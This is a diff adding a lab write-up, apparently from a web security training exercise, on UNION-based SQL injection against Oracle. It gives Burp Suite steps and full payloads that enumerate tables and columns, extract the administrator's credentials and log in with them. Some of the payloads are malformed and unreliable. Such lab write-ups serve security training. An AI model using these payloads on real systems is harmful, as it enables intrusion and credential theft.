@@ -1,0 +1,49 @@
+
+
+
+
+
+
+                           LAB #9 SQL injection attack, listing the database contents on Oracle
+                        STEPS TO REPRODUCE
+                        1. Configure your browser with proxy tool such as Burp Suite.
+                        2. Turn on the intercept of the Burp and in the application click on category
+                        3. Send the intercepted request to Burp Repeater.
+                        4. Change the category=' and Observe the resonse it's responded with internal server error 
+                           hence it may be vulnerable to sql injection 
+                        5. In the request field replace the payload category=' with category='+UNION+SELECT+NULL,+NULL+FROM+dual
+                        6. After above request the application resonded with 200 OK hence there are 2 columns in the table
+                        7. Replace the payload to category='+UNION+SELECT+table_name,+NULL+FROM+all_tables--
+                        8. In the response search for users and note down the users table name
+                        9. Replace the payload to category='+UNION+SELECT+all_tab_columns,+NULL+from+all_tables where table_name='users'
+                       10. In the response observe that the application responded with username and password name columns name
+                       11. Replace payload category='+UNION+SELECT+username+password_name+from+'users'--
+                       12. Observe the response the application responded with the administrator username and password.
+                       13. In the application Navigate to login page and login using administrator username and password and lab is solved.
+                       
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                         *** WARNING ***
+
+Listing the contents of an Oracle database
+On Oracle, you can find the same information as follows:
+    You can list tables by querying all_tables:
+    SELECT * FROM all_tables
+    You can list columns by querying all_tab_columns:
+    SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
